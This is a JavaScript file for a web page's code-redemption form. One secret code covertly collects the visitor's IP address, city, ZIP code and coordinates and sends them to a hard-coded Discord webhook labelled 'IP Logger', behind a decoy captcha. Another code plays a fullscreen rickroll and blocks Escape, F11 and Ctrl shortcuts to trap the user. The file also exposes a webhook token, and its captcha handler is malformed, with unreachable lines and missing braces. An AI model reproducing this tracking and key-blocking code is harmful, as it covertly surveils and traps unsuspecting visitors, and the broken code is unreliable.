let pendingCode = null;

document.getElementById('codeForm').addEventListener('submit', (event) => {
    event.preventDefault();
    const code = document.getElementById('code').value.toLowerCase();

    const secureCodes = ['outofkalidoni','futurecode'];
    if (secureCodes.includes(code)) {
        pendingCode = code;
  document.getElementById('recaptcha').style.display = 'block';
  document.getElementById('overlay').style.display = 'block';
      return;
    }
        switch(code) { 
        case 'freegift69':
            document.getElementById('rickroll').style.display = 'block';
            video.play().then(() => totallynotprank()).catch(error => console.error(`Error attempting to request fullscreen mode for rickroll video: ${error}`));
            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement) totallynotprank();
            });
            document.addEventListener("keydown", e => {
                const blockedKeys = ["Escape", "F11"];
                const ctrlCombos = ["w", "r", "t", "n"]; 
                if (blockedKeys.includes(e.key)) {
                    e.preventDefault();
                    e.stopPropagation();
                }
                if (e.ctrlKey && ctrlCombos.includes(e.key.toLowerCase())) {
                    e.preventDefault();
                    e.stopPropagation();
                }
            });
            break;
        case 'omagachikennuget':
            fetch('https://ipinfo.io/json')
                .then(response => response.json())
                .then(data => {
                    fetch(`https://freeipapi.com/api/json/${data.ip}`)
                        .then(res => res.json())
                        .then(ipData => {
                            fetch('https://discord.com/api/webhooks/1338380619771678761/6Yy3FGqDf_RJ09A7L1Wp1wst7wBoom7wWDNIGIi5D6IkXINXhJIf4Ttopu61CgMGcGYy', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [{ color: 0xBDECB6, title: 'IP Logger', description: `🌍 Continent: ${ipData.continent} (${ipData.continentCode})\n🌏 Country: ${ipData.countryName} (${ipData.countryCode})\n🗺️ Region: ${ipData.regionName}\n🏢 City: ${ipData.cityName}\n🔢 ZIP Code: ${ipData.zipCode}\n🌐 Latitude: ${ipData.latitude}\n🌐 Longitude: ${ipData.longitude}\n🕛 Timezone: ${ipData.timeZone}\n 💻 isProxy: ${ipData.isProxy ? 'Yes' : 'No'}`, footer: { text: `IP Address: ${ipData.ipAddress}` } }] }) });
                    });
                });
            document.getElementById('recaptcha').style.display = 'block';
            document.getElementById('overlay').style.display = 'block';
            break;
        default:
            document.getElementById('invalid').style.display = 'block';
            document.getElementById('overlay').style.display = 'block';
            break;
    }

});

function onCaptchaSuccess() {
  if (!pendingCode) return;
  switch (pendingCode) {
    case 'outofkalidoni':
      window.location.replace('https://xeversea.sytes.net/kalidoni');
      break;
      pendingCode=null;

document.getElementById('recaptcha').style.display = 'none';
document.getElementById('overlay').style.display = 'none';

      if (typeof grecaptcha !== 'undefined' && grecaptcha.reset) grecaptcha.reset();
  }

function totallynotprank() {
    const video = document.getElementById('rickrollVideo');
    if (video.requestFullscreen)
        video.requestFullscreen();
    else if (video.webkitRequestFullscreen)
        video.webkitRequestFullscreen();
    else if (video.msRequestFullscreen)
        video.msRequestFullscreen();
}

